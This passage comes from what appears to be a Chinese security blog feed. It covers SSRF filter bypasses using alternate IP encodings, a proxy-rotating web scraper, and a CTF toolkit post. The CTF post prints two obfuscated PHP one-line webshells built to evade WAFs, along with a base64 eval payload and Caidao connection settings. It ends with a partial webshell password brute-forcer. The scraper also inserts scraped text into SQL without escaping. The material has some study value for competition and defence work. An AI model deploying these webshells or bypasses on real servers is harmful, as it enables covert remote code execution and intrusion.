<h3 id="5ã€ipè¿›åˆ¶è½¬æ¢"><a href="#5ã€ipè¿›åˆ¶è½¬æ¢" class="headerlink" title="5ã€ipè¿›åˆ¶è½¬æ¢"></a>5ã€ipè¿›åˆ¶è½¬æ¢</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">é¦–å…ˆä»¥ . åˆ†å‰²æ•°å­—</div><div class="line">ç„¶åè¿›è¡Œ10è¿›åˆ¶è½¬æ¢16è¿›åˆ¶</div><div class="line">ç„¶åæŠŠè¿™ä¸²åå…­è¿›åˆ¶åˆåœ¨ä¸€èµ·å†è½¬æ¢æˆ8è¿›åˆ¶</div><div class="line">ç„¶åæŒ‡å®šåè®® http://ï¼Œå¯ç”¨ä»»æ„ä¸ª 0 ä½œä¸ºå‰ç¼€ï¼šhttp://000007F000001ï¼›</div><div class="line">ï¼ˆåœ¨å‰é¢æ·»åŠ è¿‡å¤šçš„ 0ï¼Œåœ¨å®é™…SSRFæˆ–è€…XSSä¸­æœ‰æ—¶ä¼šæˆä¸ºç»•è¿‡è¿‡æ»¤çš„å¤§æ€å™¨ï¼‰</div><div class="line"></div><div class="line">1ã€åˆ©ç”¨å…«è¿›åˆ¶IPåœ°å€ç»•è¿‡</div><div class="line">ping -w 0 -n 1 012.0.0.1</div><div class="line">2ã€åˆ©ç”¨åå…­è¿›åˆ¶IPåœ°å€ç»•è¿‡</div><div class="line">ping -w 0 -n 1 0xa.0.0.1</div><div class="line">3ã€ åˆ©ç”¨åè¿›åˆ¶çš„IPåœ°å€ç»•è¿‡</div><div class="line">ping -w 0 -n 1 167772161</div><div class="line">åœ¨PHPé‡Œä½¿ç”¨ip2long</div><div class="line">åœ¨Pythoné‡Œä½¿ç”¨inet_aton</div><div class="line">4ã€åˆ©ç”¨IPåœ°å€çš„çœç•¥å†™æ³•ç»•è¿‡</div><div class="line">ping -w 0 -n 1 10.1</div></pre></td></tr></table></figure>
<h1 id="SSRFé˜²å¾¡"><a href="#SSRFé˜²å¾¡" class="headerlink" title="SSRFé˜²å¾¡"></a>SSRFé˜²å¾¡</h1><p>æ¨èå‚è€ƒï¼š<br><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="external">è°ˆä¸€è°ˆå¦‚ä½•åœ¨Pythonå¼€å‘ä¸­æ‹’ç»SSRFæ¼æ´</a></p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> SSRF </tag>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[çˆ¬è™«å…¥åº“å®æˆ˜ä¹‹å¹²æ­»åçˆ¬è™«]]></title>
      <url>/2017/06/02/%E7%88%AC%E8%99%AB%E5%85%A5%E5%BA%93%E5%AE%9E%E6%88%98%E4%B9%8B%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86/</url>
      <content type="html"><![CDATA[<p>çˆ¬è™«å› ä¸ºéœ€è¦å¤§é‡æŠ“å–ç½‘é¡µï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šè¢«ban IPï¼Œæ‰€ä»¥é€šå¸¸ä½¿ç”¨åŠ UAã€ä»£ç†ã€XFFç­‰ä¼ªé€ çœŸå®IPç­‰ç­–ç•¥ï¼Œå…¶ä¸­X-Forwarded-For,Client-ip,REMOTE_ADDRå¯ä»¥ä½¿ç”¨burpçš„çˆ†ç ´æ¨¡å—ï¼Œå››ä¸ªpayloadéšæœºç”Ÿæˆå°±è¡Œäº†ï¼Œæœ¬æ–‡é‡ç‚¹ä½¿ç”¨UAã€ä»£ç†IPæµ‹è¯•ã€‚<br><a id="more"></a></p>
<h1 id="0x00-è®¾ç½®ç¼–ç "><a href="#0x00-è®¾ç½®ç¼–ç " class="headerlink" title="0x00 è®¾ç½®ç¼–ç "></a>0x00 è®¾ç½®ç¼–ç </h1><p>é¦–å…ˆè®¾ç½®ä¸‹é»˜è®¤ç¼–ç ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">æ–‡ä»¶ç¼–ç </div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</div><div class="line">æ•°æ®åº“ç¼–ç </div><div class="line">CREATE DATABASE &apos;proxy&apos; DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</div><div class="line">æ•°æ®ä¼ è¾“ç¼–ç </div><div class="line">charset=&apos;utf8mb4&apos;</div></pre></td></tr></table></figure></p>
<h1 id="0x01-è®¾ç½®UA"><a href="#0x01-è®¾ç½®UA" class="headerlink" title="0x01 è®¾ç½®UA"></a>0x01 è®¾ç½®UA</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">config=&#123;</div><div class="line">        &apos;NUM&apos;:10,</div><div class="line">        &apos;timeout&apos;:5,</div><div class="line">        &apos;USER_AGENTS&apos;:[</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;,</div><div class="line">    &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;</div><div class="line">headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125;</div></pre></td></tr></table></figure>
<p>å¯ä»¥ä½¿ç”¨å­—å…¸æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä¸ºäº†ç®€ä¾¿å°±éšæœºç²˜äº†å‡ ä¸ªã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/spider_1.png" alt=""></p>
<h1 id="0x02-è®¾ç½®äº¤äº’æ–¹å¼"><a href="#0x02-è®¾ç½®äº¤äº’æ–¹å¼" class="headerlink" title="0x02 è®¾ç½®äº¤äº’æ–¹å¼"></a>0x02 è®¾ç½®äº¤äº’æ–¹å¼</h1><p>æ•°æ®äº¤äº’ä½¿ç”¨pythonçš„PyMySQLæ¨¡å—ï¼Œæ”¯æŒpy2,py3ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">conn = pymysql.connect(</div><div class="line"> host=&apos;127.0.0.1&apos;,</div><div class="line"> port=3306,</div><div class="line"> user=&apos;root&apos;,</div><div class="line"> passwd=&apos;123456&apos;,</div><div class="line"> db=&apos;proxy&apos;,</div><div class="line"> charset=&apos;utf8mb4&apos;,</div><div class="line"> )</div><div class="line">cur = conn.cursor()</div><div class="line">sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test1&apos;,&apos;100&apos;)&quot;</div><div class="line">cur.execute(sql)</div></pre></td></tr></table></figure></p>
<h1 id="0x03-ä»£ç†è·å–"><a href="#0x03-ä»£ç†è·å–" class="headerlink" title="0x03 ä»£ç†è·å–"></a>0x03 ä»£ç†è·å–</h1><p>ä»£ç†ä½¿ç”¨å…è´¹çš„è¥¿åˆºä»£ç†(æ²¡é’±-.-)ï¼Œä½¿ç”¨requestsã€BeautifulSoupåšæ•°æ®å¤„ç†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">r = requests.get(url=url_xichi,headers=headers)</div><div class="line">soup = bs(r.content,&apos;lxml&apos;)</div><div class="line">datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;)</div><div class="line">for data in datas:</div><div class="line">    proxys = data.find_all(name=&apos;td&apos;)</div><div class="line">    ip = str(proxys[1].string)</div><div class="line">    port = str(proxys[2].string)</div><div class="line">    type = str(proxys[5].string).lower()</div><div class="line">    avail_proxy = proxy_check(ip,port,type)</div><div class="line">    if avail_proxy != None:</div><div class="line">        return avail_proxy</div></pre></td></tr></table></figure></p>
<h1 id="0x04-ä»£ç†éªŒè¯"><a href="#0x04-ä»£ç†éªŒè¯" class="headerlink" title="0x04 ä»£ç†éªŒè¯"></a>0x04 ä»£ç†éªŒè¯</h1><p>éªŒè¯ä»£ç†çš„å­˜æ´»æ€§ï¼Œä½¿ç”¨ç«™é•¿å·¥å…·çš„ipå®šä½å®ç°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">try:</div><div class="line">    r = requests.get(url=url_check,proxies=proxylist,timeout=5)</div><div class="line">    find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0]</div><div class="line">    if ip == find_ip:</div><div class="line">        return proxylist</div><div class="line">except Exception,e:</div><div class="line">    pass</div></pre></td></tr></table></figure></p>
<h1 id="0x05-æ•°æ®å…¥åº“"><a href="#0x05-æ•°æ®å…¥åº“" class="headerlink" title="0x05 æ•°æ®å…¥åº“"></a>0x05 æ•°æ®å…¥åº“</h1><p>è¿™é‡Œå°±ä»¥è°·å®‰ç½‘æ ¡çš„è¯¾ç¨‹æ¥çˆ¬ï¼Œä¸»è¦çˆ¬è¯¾ç¨‹åå­—åŠå¯¹åº”çš„ä»·æ ¼ã€‚<br>æ•ˆæœå¦‚ä¸‹å›¾ï¼š<br><img src="http://oa8y5guqs.bkt.clouddn.com/spider_2.png" alt=""><br><strong>é™„ï¼šæºä»£ç </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šW2n1ck</div><div class="line">@Indexï¼šhttp://www.w2n1ck.com/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import random</div><div class="line">import re</div><div class="line">import requests</div><div class="line">import pymysql</div><div class="line">import sys</div><div class="line">import time</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</div><div class="line"></div><div class="line">from bs4 import BeautifulSoup as bs</div><div class="line"></div><div class="line">config=&#123;</div><div class="line">        &apos;NUM&apos;:10,</div><div class="line">        &apos;timeout&apos;:5,</div><div class="line">        &apos;USER_AGENTS&apos;:[</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;,</div><div class="line">    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;,</div><div class="line">    &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;,</div><div class="line">    &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,]&#125;</div><div class="line">headers = &#123;&apos;User-Agent&apos;: random.choice(config[&apos;USER_AGENTS&apos;])&#125;</div><div class="line">proxy = []</div><div class="line"></div><div class="line">conn = pymysql.connect(</div><div class="line"> host=&apos;127.0.0.1&apos;,</div><div class="line"> port=3306,</div><div class="line"> user=&apos;root&apos;,</div><div class="line"> passwd=&apos;123456&apos;,</div><div class="line"> db=&apos;proxy&apos;,</div><div class="line"> charset=&apos;utf8mb4&apos;,</div><div class="line"> )</div><div class="line">cur = conn.cursor()</div><div class="line">#sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;test2&apos;,&apos;200&apos;)&quot;</div><div class="line">#cur.execute(sql)</div><div class="line"></div><div class="line">def proxy_spider():</div><div class="line">    url_xichi = &apos;http://www.xicidaili.com/nn/&apos;</div><div class="line">    r = requests.get(url=url_xichi,headers=headers)</div><div class="line">    soup = bs(r.content,&apos;lxml&apos;)</div><div class="line">    datas = soup.find_all(name=&apos;tr&apos;,attrs=&#123;&apos;class&apos;:re.compile(&apos;(odd)|()&apos;)&#125;)</div><div class="line">    #print datas</div><div class="line">    for data in datas:</div><div class="line">        proxys = data.find_all(name=&apos;td&apos;)</div><div class="line">        ip = str(proxys[1].string)</div><div class="line">        #ip = &apos;http://&apos;+ip</div><div class="line">        port = str(proxys[2].string)</div><div class="line">        type = str(proxys[5].string).lower()</div><div class="line">        avail_proxy = proxy_check(ip,port,type)</div><div class="line">        if avail_proxy != None:</div><div class="line">            return avail_proxy</div><div class="line">def proxy_check(ip,port,type):</div><div class="line">    url_check = &apos;http://ip.chinaz.com/getip.aspx&apos;</div><div class="line">    proxylist = &#123;&#125;</div><div class="line">    proxylist[type] = &apos;%s:%s&apos; % (ip,port)</div><div class="line">    #print proxylist</div><div class="line">    try:</div><div class="line">        r = requests.get(url=url_check,proxies=proxylist,timeout=5)</div><div class="line">        find_ip = re.findall(r&apos;\&apos;(.*?)\&apos;&apos;,r.text)[0]</div><div class="line">        #print find_ip</div><div class="line">        if ip == find_ip:</div><div class="line">            return proxylist</div><div class="line">            #proxy.append(find_ip)</div><div class="line">        #print proxy</div><div class="line">    except Exception,e:</div><div class="line">        pass</div><div class="line"></div><div class="line">def decode_str(str):</div><div class="line">    return str.replace(&apos; &apos;,&apos;&apos;).replace(&apos;\t&apos;,&apos;&apos;).replace(&apos;\n&apos;,&apos;&apos;).encode(&apos;utf-8&apos;)</div><div class="line"></div><div class="line">def get_title_price(url):</div><div class="line">    proxy_url = proxy_spider()</div><div class="line">    r = requests.get(url=url,proxies=proxy_url,timeout=20)</div><div class="line">    content = r.content</div><div class="line">    soup = bs(content,&apos;lxml&apos;)</div><div class="line">    content_titles = soup.find_all(name=&apos;a&apos;,attrs=&#123;&apos;class&apos;:&apos;link-dark&apos;&#125;)</div><div class="line">    content_prices = soup.find_all(name=&apos;span&apos;,attrs=&#123;&apos;class&apos;:&apos;price&apos;&#125;)</div><div class="line">    for title,price in zip(content_titles,content_prices):</div><div class="line">        tmp_title = decode_str(str(title.string))</div><div class="line">        tmp_price = decode_str(str(price.string))</div><div class="line">        print tmp_title,tmp_price</div><div class="line">        sql = &quot;INSERT INTO proxylist(title,price) VALUES (&apos;%s&apos;,&apos;%s&apos;)&quot;%(tmp_title,tmp_price)</div><div class="line">        cur.execute(sql)</div><div class="line">if __name__==&apos;__main__&apos;:</div><div class="line">    #proxy_spider()</div><div class="line">    url_spider = &apos;http://edu.aqniu.com/course/explore?page=&apos;</div><div class="line">    for i in range(12):</div><div class="line">        spider_url = url_spider+str(i)</div><div class="line">        get_title_price(spider_url)</div><div class="line">        time.sleep(random.random()*1)</div><div class="line">    cur.close()</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> ä»£ç† </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTFçº¿ä¸‹èµ›ç›¸å…³å·¥å…·]]></title>
      <url>/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<p>ä¸Šä¸Šå‘¨æ‰“äº†å¤§å­¦ç”Ÿæ¶¯çš„æœ€åä¸€åœºCTFæ¯”èµ›ï¼Œæ„Ÿè§‰ç»™è€å¸ˆä¸¢äººäº†ï¼Œè‡ªå·±èµ›å‰å‡†å¤‡çš„ä¸œè¥¿ä¹Ÿæ²¡å’‹ç”¨ä¸Šï¼Œå¾ˆæ†‹å±ˆå•Šï¼ä¸è¯´äº†ï¼Œè¿˜æ˜¯å¤ªèœï¼è¿™ä¸¤å‘¨å¿™ç€æ¯•ä¸šè®¾è®¡çš„äº‹ï¼Œä¸€ç›´æ²¡æ—¶é—´å†™ã€‚æŠŠè‡ªå·±æ”¶é›†çš„èµ„æ–™åˆ†äº«ä¸‹å§ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œè¯·å¤§ç‰›ä»¬æŒ‡å¯¼ä¸‹ã€‚<br><a id="more"></a></p>
<h1 id="ä¸€ã€linux-tcpdumpä½¿ç”¨"><a href="#ä¸€ã€linux-tcpdumpä½¿ç”¨" class="headerlink" title="ä¸€ã€linux tcpdumpä½¿ç”¨"></a>ä¸€ã€linux tcpdumpä½¿ç”¨</h1><p>tcpdumpçš„é‡è¦æ€§ä¸ç”¨æˆ‘è¯´äº†å§ï¼Œéƒ½æ‡‚ï¼Œä½†æ˜¯åœ¨CTFä¸­å¯èƒ½ä¼šæ²¡æœ‰æƒé™ä½¿ç”¨ã€‚ä½†æ˜¯å·¥ä½œä¸­è‚¯å®šä¼šç”¨åˆ°çš„ï¼Œç›¸ä¿¡æˆ‘ï¼Œä¸è¦ä¸ºCTFè€ŒCTFâ€¦ï¼ˆä¸å¥½æ„æ€æ‰¯æ·¡äº† =.=ï¼‰</p>
<h2 id="1-1ã€è¿‡æ»¤ä¸»æœº"><a href="#1-1ã€è¿‡æ»¤ä¸»æœº" class="headerlink" title="1.1ã€è¿‡æ»¤ä¸»æœº"></a>1.1ã€è¿‡æ»¤ä¸»æœº</h2><p>æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„æˆ–æºåœ°å€æ˜¯192.168.1.1çš„ç½‘ç»œæ•°æ®<br>    tcpdump -i eth1 host 192.168.1.1<br>æŒ‡å®šæºåœ°å€<br>    tcpdump -i eth1 src host 192.168.1.1<br>æŒ‡å®šç›®çš„åœ°å€<br>    tcpdump -i eth1 dst host 192.168.1.1</p>
<h2 id="1-2ã€è¿‡æ»¤ç«¯å£"><a href="#1-2ã€è¿‡æ»¤ç«¯å£" class="headerlink" title="1.2ã€è¿‡æ»¤ç«¯å£"></a>1.2ã€è¿‡æ»¤ç«¯å£</h2><p>æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„æˆ–æºç«¯å£æ˜¯25çš„ç½‘ç»œæ•°æ®<br>    tcpdump -i eth1 port 25<br>æŒ‡å®šæºç«¯å£<br>    tcpdump -i eth1 src port 25<br>æŒ‡å®šç›®çš„ç«¯å£<br>    tcpdump -i eth1 dst port 25</p>
<h2 id="1-3ã€ç½‘ç»œè¿‡æ»¤"><a href="#1-3ã€ç½‘ç»œè¿‡æ»¤" class="headerlink" title="1.3ã€ç½‘ç»œè¿‡æ»¤"></a>1.3ã€ç½‘ç»œè¿‡æ»¤</h2><pre><code>tcpdump -i eth1 net 192.168
tcpdump -i eth1 src net 192.168
tcpdump -i eth1 dst net 192.168
</code></pre><h2 id="1-4ã€åè®®è¿‡æ»¤"><a href="#1-4ã€åè®®è¿‡æ»¤" class="headerlink" title="1.4ã€åè®®è¿‡æ»¤"></a>1.4ã€åè®®è¿‡æ»¤</h2><pre><code>tcpdump -i eth1 arp
tcpdump -i eth1 ip
tcpdump -i eth1 tcp
tcpdump -i eth1 udp
tcpdump -i eth1 icmp
</code></pre><h2 id="1-5ã€å¸¸ç”¨è¡¨è¾¾å¼"><a href="#1-5ã€å¸¸ç”¨è¡¨è¾¾å¼" class="headerlink" title="1.5ã€å¸¸ç”¨è¡¨è¾¾å¼"></a>1.5ã€å¸¸ç”¨è¡¨è¾¾å¼</h2><pre><code>é : ! or &quot;not&quot; (å»æ‰åŒå¼•å·)
ä¸” : &amp;&amp; or &quot;and&quot;
æˆ– : || or &quot;or&quot;
</code></pre><p>æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„åœ°å€æ˜¯192.168.1.254æˆ–192.168.1.200ç«¯å£æ˜¯80çš„TCPæ•°æ®<br>    tcpdump -i eth1 â€˜((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))â€™<br>æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®æ ‡MACåœ°å€æ˜¯00:01:02:03:04:05çš„ICMPæ•°æ®<br>    tcpdump -i eth1 â€˜((icmp) and ((ether dst host 00:01:02:03:04:05)))â€™<br>æŠ“å–æ‰€æœ‰ç»è¿‡eth1ï¼Œç›®çš„ç½‘ç»œæ˜¯192.168ï¼Œä½†ç›®çš„ä¸»æœºä¸æ˜¯192.168.1.200çš„TCPæ•°æ®<br>    tcpdump -i eth1 â€˜((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))â€™</p>
<h1 id="äºŒã€ä¸€å¥è¯æœ¨é©¬"><a href="#äºŒã€ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="äºŒã€ä¸€å¥è¯æœ¨é©¬"></a>äºŒã€ä¸€å¥è¯æœ¨é©¬</h1><p>ä¸€å¥è¯æœ¨é©¬ä¸»è¦è¾¾åˆ°çš„ç›®çš„å°±æ˜¯å°±ç®—åˆ«äººçœ‹åˆ°äº†è¿™ä¸ªwebshellï¼Œä»–ä»¬ä¹Ÿä¸ä¼šç”¨ã€‚ä¸ç„¶åˆ«äººç›´æ¥åˆ©ç”¨ä½ ï¼Œç”¨çš„webshellæ”¶å‰²flagã€‚æˆ‘ä»è‡ªå·±æœé›†çš„è¿‡wafçš„webshellä¸­æŒ‘äº†ä¸¤ä¸ªã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;</div></pre></td></tr></table></figure></p>
<p>åŸç†æˆ‘å°±ä¸è®²äº†ï¼Œçœ‹ä¸€ä¸‹ä½ å°±æ˜ç™½äº†ï¼Œå¾ˆç®€å•ã€‚<code>QGV2YWwoJF9QT1NUWzBdKTs=</code>éšæ„å˜ã€‚<br>èœåˆ€é…ç½®å¡«<code>&lt;O&gt;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=&lt;/O&gt;</code><br>è¿æ¥å¯†ç :0ï¼ˆé›¶ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;</div></pre></td></tr></table></figure></p>
<p>èœåˆ€è¿æ¥å¯†ç :1ï¼Œè‡ªå·±å¯ä»¥æ”¹æ”¹ï¼Œä¸»è¦å­¦æ€è·¯ã€‚</p>
<h1 id="ä¸‰ã€webshellçˆ†ç ´"><a href="#ä¸‰ã€webshellçˆ†ç ´" class="headerlink" title="ä¸‰ã€webshellçˆ†ç ´"></a>ä¸‰ã€webshellçˆ†ç ´</h1><p>ç®€å•ç²—æš´ï¼Œåªè¦å‘ç°ï¼Œå•¥éƒ½ä¸ç”¨æƒ³ï¼Œæ‹¿èµ·å·¥å…·å°±æ˜¯å¹²ï¼<br>webshellçˆ†ç ´é‡‡ç”¨ä¹‹å‰toolsåˆ†äº«çš„æ€è·¯ï¼ŒApacheä¸€æ¬¡å…è®¸åŒæ—¶æäº¤1000ä¸ªå‚æ•°ï¼Œ IISå…è®¸ä¸€æ¬¡æäº¤5883ä¸ªå‚æ•°ã€‚<br>è¿™é‡Œæˆ‘ä¸»è¦ç”¨äº†ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯K8å†™çš„GUIç‰ˆæœ¬çš„ï¼Œæ”¯æŒPHPã€JSPã€ASPã€ASPXç­‰<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF1.png" alt=""><br>ä¸€ä¸ªæ˜¯è‡ªå·±å†™çš„PHPçš„ã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF2.png" alt=""><br>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">1000å¤„ç†</div><div class="line">for i in range(0,dics):</div><div class="line">    new_group = []</div><div class="line">    for m in range(i*1000,(i+1)*1000):</div><div class="line">        new_group.append(group[m])</div><div class="line">        m += 1</div><div class="line">    for n in new_group:</div><div class="line">        post_data[n] = &apos;echo &quot;password is :%s&quot;;&apos; % n</div><div class="line">    req = requests.post(url,data=post_data)</div><div class="line">    print u&quot;æ­£åœ¨è¿›è¡Œç¬¬ %s ç»„å­—å…¸çˆ†ç ´&quot; % str(i + 1)</div><div class="line">    print req.content+&apos;****************************-SUCCESS!&apos;</div><div class="line">    post_data.clear()</div><div class="line">ä½™æ•°å¤„ç†</div><div class="line">new_group1 = []</div><div class="line">for kk in 